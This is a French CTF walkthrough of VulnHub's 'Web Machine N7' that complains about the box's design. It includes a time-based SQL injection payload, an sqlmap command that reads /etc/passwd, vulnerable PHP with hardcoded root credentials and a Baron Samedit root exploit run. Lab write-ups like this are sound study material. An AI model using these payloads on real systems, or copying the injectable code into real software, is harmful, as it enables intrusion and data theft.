# Solution du CTF Web Machine N7 de VulnHub

Worst CTF Ever
--------------

[Web Machine N7](https://www.vulnhub.com/entry/web-machine-n7,756/) est le nom d'un CTF téléchargeable sur VulnHub (le dernier publié au moment de ces lignes) et a été créé par un certain *Duty Mastr* qu'ils auraient mieux fait de noyer à la naissance.  

C'est déjà avec une certaine appréhension que je télécharge la VM puisque déjà elle fait 5.7Go et d'après la capture d'écran sur VulnHub elle est basée sur une installation graphique de Kali Linux. Mais quel genre d'abrutit utiliserait Kali Linux comme base pour un CTF ?  

Une fois la VM importée on remarque qu'elle est configurée pour utiliser 8192 Mo de RAM là où 4096 sera amplement suffisant.  

Le nanard des CTF
-----------------

Un seul port ouvert, bien sûr un serveur Apache. Le site est une coquille vide et il faut tester un bon nombre de wordlists avant d’obtenir plus que le fichier *profile.php* et la page d'index. Mais, en testant tous les mots de la langue de Shakespeare, on découvre une page supplémentaire :  

```plain
$ feroxbuster -u http://192.168.56.18/ -w /opt/hdd/downloads/tools/wordlists/english -x php,html,txt

200       11l       27w      279c http://192.168.56.18/exploit.html
200       49l      107w     1620c http://192.168.56.18/index.html
200       43l       94w     1473c http://192.168.56.18/profile.php
```

Cette page *exploit.html* correspond à un formulaire d'upload qui poste vers *localhost/profile.php*.  

On peut bêtement utiliser les outils de développement du navigateur pour corriger cette URL avec la bonne adresse IP pour faire fonctionner l'upload.  

On est remercié par un flag mais le fichier n'est uploadé nul part... On a donc ici une étape qui ne sert à rien.  

Après encore plus d'énumération et comme on ne trouve rien il faut bien chercher sur Internet si quelqu'un est allé plus loin.  

Il existe en fait un dossier *enter\_network* à la racine du site que personne n'aurait pu trouver (mis à part en trichant) puisque ce path n'est présent dans aucune wordlist existante !  

Là on découvre une page de login dont Wapiti découvre rapidement qu'elle est vulnérable à une faille d'injection SQL en aveugle :  

```plain
---
Vulnérabilité d'injection SQL en aveugle dans http://192.168.56.18/enter_network/ via une injection dans le paramètre user
Evil request:
    POST /enter_network/ HTTP/1.1
    Host: 192.168.56.18
    Referer: http://192.168.56.18/enter_network/
    Content-Type: application/x-www-form-urlencoded

    user=%27%20or%20sleep%287%29%231&pass=Letm3in_&sub=SEND
---
```

A partir de là on joue un peu avec SQLmap. Forcément au vue de l'exploitation time-based c'est très lent mais on peut par exemple trouver le flag utilisé comme mot de passe pour l'administrateur dans une des tables.  

Ceci ne nous amène là encore strictement nul part. Toutefois les requêtes sont faites avec l'utilisateur *root* ce qui nous permet de lire les scripts web sur le serveur (avec l'option *--file-read* de SQLmap).  

```plain
python sqlmap.py -u "http://192.168.56.18/enter_network/" --data "user=zz&pass=zz&sub=SEND" -p user --dbms mysql --risk 3 --level 5  --technique=T --file-read=/etc/passwd --no-cast --time-sec=2
```

Par exmple le fichier */var/www/html/enter\_network/index.php* :  

```php
<!DOCTYPE html>
<html>
<head>
    <title>entering network</title>
</head>
<body>
    <?php
    $hostname = 'localhost';
    $username = 'root';
    $password = '123456789';
    $database = 'Machine';
$connect = mysqli_connect($hostname,$username,$password,$database);

if (isset($_POST['sub'])) {
    $user = $_POST['user'];
    $pass = $_POST['pass'];
    $query = "select * from login where username='$user' and password='$pass'";
    $result = mysqli_query($connect,$query);
    $row = mysqli_fetch_assoc($result);
    $role = 'admin';
    $role = urlencode(base64_encode(md5($role)));
    $cookie = $row['username'].':'.$row['password'];
    $cookie = base64_encode(password_hash($cookie,2));
    setcookie('user',$cookie, time()+10000,'/');
    setcookie('role',$role,time()+10000,'/');
}

?>
<center>
<form action="" method="POST">
    username: <input type="text" name="user">
    <br>
    password: <input type="password" name="pass">
    <br>
    <input type="submit" name="sub" value="SEND">
</form>
</center>

</body>
</html>
```

Le fichier */var/www/html/enter\_network/admin.php* :  

```php
<!DOCTYPE html>
<html>
    <head><title>admin interface</title></head>
<body>
    <?php
$hostname = 'localhost';
$username = 'root';
$password = '123456789';
$database = 'Machine';
$connect = mysqli_connect($hostname,$username,$password,$database);
$query = "select password from login";
$result = mysqli_query($connect,$query);
$row = mysqli_fetch_assoc($result);

if ($_COOKIE['role'] == 'admin') {
    $FLAG = explode(':',$row['password']);    
    echo $FLAG[1];;
}
else {
    echo 'this interface is admin only';
}

?>
</body>
</html>
```

et le fichier *profile.php* à la racine du site :  

```php
<?php
$hostname = 'localhost';
$username = 'root';
$password = '123456789';
$database = 'Machine';
$connect = mysqli_connect($hostname,$username,$password,$database);
$query = "select password from login";
$result = mysqli_query($connect,$query);
$row = mysqli_fetch_assoc($result);

if (isset($_FILES['file'])) {
    $FLAG = explode(':',$row['password']);    
    echo $FLAG[0];
}
?>
```

Oui vous avez bien compris, ces scripts ne permettent pas d'aller plus loin que la faille SQL déjà trouvée !  

On peut espérer profiter des droits root pour écrire un fichier sur le disque avec *SELECT INTO OUTFILE* sauf que c'est impossible car après vérification */var/www/html* est la propriété de root et donc *www-data* ne peut pas écrire dessus mais de plus l'utilisation d'une version récente de MySQL/MariaDB bloque ce genre de chose...  

Pour résumer on a :  

* des étapes qui ne servent à rien
* des étapes qui ne s'enchaînent pas
* un dossier impossible à trouver
* une VM d'une taille largement exagérée pour faire tourner 3 scripts PHP
* aucune découverte technique ni aucun plaisir sur ce CTF

Sous le capot
-------------

Si on boot la VM et que l'on sélectionne les options avancées on peut éditer l'entrée GRUB avec la touche *e* et [changer le mot de passe root](https://linuxconfig.org/recover-reset-forgotten-linux-root-password) histoire de fouiller un peu.  

Comme dit plus tôt toute écriture sur le disque est vouée à l'échec en raison des permissions. Seul le fichier *profile.php* dispose de permissions qui autorisent sa réécriture mais un des prérequis de *SELECT INTO OUTFILE* est que le fichier ne doit pas déjà exister.  

```plain
┌──(root💀kali)-[/var/www/html]
└─# ls -al /var/www/html 
total 176
drwxr-xr-x 3 root     root   4096 Oct 30 01:43 .
drwxr-xr-x 3 root     root   4096 Oct 29 21:10 ..
-rwxr-xr-x 1 root     root 149791 Oct 30 01:01 bootstrap.min.css
drwxr-xr-x 2 root     root   4096 Oct 30 01:44 enter_network
-rw-r--r-- 1 root     root    279 Oct 30 01:04 exploit.html
-rwxr-xr-x 1 root     root   1620 Oct 30 01:01 index.html
-rwxr-xr-x 1 root     root      0 Oct 30 01:01 javascript.js
-rwxrwxrwx 1 www-data root   1860 Oct 30 01:43 profile.php
-rwxr-xr-x 1 root     root    293 Oct 30 01:01 style.css
```

Soit l'auteur a choisit d'arrêter les frais à ce moment, soit il ne sait pas lire une page de manuel et dans tous les cas il n'a pas du tester son propre CTF.  

On découvre d'ailleurs en fouillant sur la machine qu'aucune exploitation locale n'a été mis en place volontairement. Le système est tout de même vulnérable à la faille Sudo Baron Samedit :  

```plain
┌──(kali㉿kali)-[~/CVE-2021-3156-main]
└─$ python exploit_nss.py 
# id
uid=0(root) gid=0(root) groups=0(root),24(cdrom),25(floppy),27(sudo),29(audio),30(dip),44(video),46(plugdev),109(netdev),118(bluetooth),129(lpadmin),135(scanner),148(kaboxer),1000(kali)
# lsb_release -a
No LSB modules are available.
Distributor ID: Kali
Description:    Kali GNU/Linux Rolling
Release:        2020.4
Codename:       kali-rolling
```

Bref un CTF inutile et inutilisable qui ne fait que gaspiller du temps, de l'espace disque et de la bande passante.  


*Published January 09 2022 at 14:21*